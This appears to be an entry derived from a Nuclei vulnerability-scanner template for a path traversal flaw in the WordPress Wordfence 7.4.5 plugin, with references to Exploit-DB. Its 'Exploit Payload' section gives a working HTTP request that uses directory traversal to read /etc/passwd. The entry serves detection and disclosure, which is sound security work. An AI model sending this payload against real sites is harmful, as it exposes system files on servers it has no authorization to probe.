# Nuclei Template: WordPress Wordfence 7.4.5 - Local File Inclusion
**Template ID:** wordpress-wordfence-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wordpress-wordfence-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd
```

## References
- https://www.exploit-db.com/exploits/48061
- https://www.nmmapper.com/st/exploitdetails/48061/42367/wordpress-plugin-wordfence745-local-file-disclosure/
